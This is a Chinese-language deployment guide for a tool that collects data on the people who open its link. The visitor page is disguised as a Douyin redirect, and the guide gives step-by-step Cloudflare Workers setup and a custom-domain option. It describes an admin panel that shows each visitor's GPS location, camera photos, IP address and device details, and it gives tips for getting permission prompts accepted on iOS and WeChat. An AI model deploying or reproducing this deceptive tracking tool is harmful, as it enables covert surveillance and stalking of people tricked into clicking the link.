# 访客数据收集系统 — 部署指南

## 📁 文件结构

```
├── index.html      访客前端（伪装抖音跳转页）
├── admin.html      后台管理页
├── worker.js       Cloudflare Worker 模板
├── build.js        构建脚本（将HTML内嵌进Worker）
├── wrangler.toml   Cloudflare 配置
└── package.json    依赖配置
```

---

## 🚀 部署步骤（全程免费，无需绑卡）

### 第一步：注册 Cloudflare 账号
访问 https://dash.cloudflare.com/sign-up 注册（免费）

### 第二步：创建 KV 命名空间
1. 登录后，进入 **Workers & Pages** → **KV**
2. 点击 **Create namespace**，名称填 `visitor_records`，点确认
3. 复制生成的 **ID**（一串随机字符）

### 第三步：修改配置文件
编辑 `wrangler.toml`，把 `YOUR_KV_NAMESPACE_ID` 替换成上面复制的 ID：
```toml
id = "abc123def456..."  # 你的真实 KV ID
```

### 第四步：修改后台密码
编辑 `worker.js`，找到这一行，改成你自己的密码：
```js
const ADMIN_PASSWORD = 'your_password_here';  // ← 改这里
```

### 第五步：安装 Wrangler 并构建
```bash
npm install
npm run build    # 生成 src/worker.js
```

### 第六步：登录 Cloudflare 并部署
```bash
npx wrangler login    # 会打开浏览器，点击授权
npm run deploy        # 部署到 Cloudflare Workers
```

部署成功后，你会看到一个地址，类似：
```
https://visitor-collector.你的账号名.workers.dev
```

### 第七步：（可选）绑定自定义域名
如果你有域名 `zhan0301.cc.cd`：
1. Cloudflare Dashboard → Workers → 你的 Worker → **Triggers**
2. 点 **Add Custom Domain**，输入 `zhan0301.cc.cd`
3. 访客链接就变成 `https://zhan0301.cc.cd`

---

## 🔗 链接说明

| 链接 | 用途 |
|------|------|
| `https://你的域名/` | 发给别人点的链接 |
| `https://你的域名/admin` | 后台管理（需输入密码） |

---

## 📊 后台功能

- 实时查看所有访客记录
- 显示 GPS 坐标（可点击跳转 Google Maps / 高德地图）
- 显示拍摄的照片（如果用户允许相机权限）
- 设备信息：IP、系统、浏览器、语言、屏幕分辨率
- Cloudflare 提供的国家/城市信息
- 导出 JSON / 清空数据

---

## ⚠️ 注意事项

1. **HTTPS 必须**：`navigator.geolocation` 和 `getUserMedia` 只在 HTTPS 下工作，Cloudflare Workers 默认 HTTPS ✅
2. **用户需点击"允许"**：浏览器会弹出系统权限弹窗，用户需要手动允许
3. **iOS Safari 限制**：相机权限需要用户明确交互触发，已通过按钮点击解决 ✅
4. **微信内置浏览器**：定位可能需要额外授权，部分功能受限
5. **KV 免费额度**：每天 10 万次读写，完全够用

---

## 🔧 上传到 GitHub（可选，用于版本管理）

```bash
git init
git add .
git commit -m "init"
git remote add origin https://github.com/你的账号/你的仓库名.git
git push -u origin main
```

之后每次修改，运行 `npm run deploy` 即可重新部署。
